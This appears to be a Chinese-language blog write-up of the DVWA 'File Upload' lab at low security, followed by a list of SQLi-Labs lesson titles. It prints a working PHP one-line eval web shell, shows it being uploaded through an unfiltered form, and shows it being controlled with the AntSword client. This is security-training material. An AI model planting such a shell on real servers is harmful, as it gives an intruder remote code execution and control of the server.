entry.title: File Upload
entry.content: <h1>Low<h1> 它让我们上传一个文件 ![](https://raw.githubusercontent.com/LoveCtrl-Tan/BlogPicture-/master/QQ截图20191019211931.png) 我们查看源代码 ![](https://raw.githubusercontent.com/LoveCtrl-Tan/BlogPicture-/master/QQ截图20191019212032.png) 发现它并没有对上传的文件进行过滤，那我们直接上传`php`一句话木马`<?php @eval($_POST[value]);?>` ![](https://raw.githubusercontent.com/LoveCtrl-Tan/BlogPicture-/master/QQ截图20191019212333.png) 显示上传成功，我们来打开看看 ![](https://raw.githubusercontent.com/LoveCtrl-Tan/BlogPicture-/master/QQ截图20191019212440.png) 发现一片空白，这就说明它以及被成功解析啦，接下来我们用`中国蚁剑`来用`value`连接 ![](https://raw.githubusercontent.com/LoveCtrl-Tan/BlogPicture-/master/QQ截图20191019212614.png) ![](https://raw.githubusercontent.com/LoveCtrl-Tan/BlogPicture-/master/QQ截图20191019212642.png) 成功连接

entry.title: SQL-LABS
entry.content:
• GET-Error based - Single quotes-String Less-1
  • GET-Error based-intiger based Less-2
  • GET-Error bases-Single quotes with twist-string Less-3
  • GET -Error based-Double Quotes-String Less-4
